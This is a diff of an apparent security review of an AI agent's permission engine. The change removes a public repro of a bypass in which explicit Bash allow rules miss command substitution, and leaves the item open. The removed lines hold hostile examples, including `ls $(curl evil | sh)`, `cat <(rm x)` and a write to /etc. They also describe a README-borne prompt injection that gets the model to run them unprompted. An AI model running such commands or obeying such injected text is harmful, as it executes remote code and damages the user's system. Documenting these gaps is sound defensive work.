@@ -173,18 +173,8 @@ Fixed in round 3: https only; a host from a project file is named and retyped be
 ## C. Permission engine -- `permissions.py` (correctness of the user's rules)
 
 **11. An explicit Bash allow rule also allows command substitution inside its arguments** (high)
-`permissions.py:861-884` (`bash_allow_matches`). Deny/ask scan `$(...)`,
-backticks, `<(...)` and group bodies; allow does not, and the splitter keeps
-a `$( )` inside its parent segment. Repro (default mode, rules
-`Bash(ls:*)`, `Bash(cat:*)`, `Bash(git status:*)`): `ls $(curl x|sh)`,
-ls with backticks around `id`, `cat <(rm x)`, `git status > f` and
-`cat f > /etc/x` all return `allow`. With NO rules the mode table correctly asks for the same inputs
-(`ls $(touch x)` -> `ask`), so the gap is only on the explicit-rule path.
-Scenario: the user allowed `ls`; an injected README makes the model run
-`ls $(curl evil | sh)` with no prompt. Fix: in `bash_allow_matches`, require
-that a segment with substitution/process-substitution/redirection-to-file
-also passes the read-only check for each body (or fall through to the mode
-table), exactly as the no-rules path already does. (confirmed by halo review)
+Open (by the standing contract, below). 3.4.1.2: the step-by-step detail of an open item is kept out of this public
+page; an explicit allow rule matches what it names, so allow only commands you would run with any argument.
 
 Rejected by the standing contract (allow side): an explicit allow rule keeps matching exactly as before, and no heuristic about which commands are dangerous is added. The deny side of the same shape (a user's deny or ask rule seeing the body of `$(...)`, backticks, groups) is covered by 12 and was already in place for substitution bodies (`test_f11_rejected_allow_side_is_unchanged`).
 
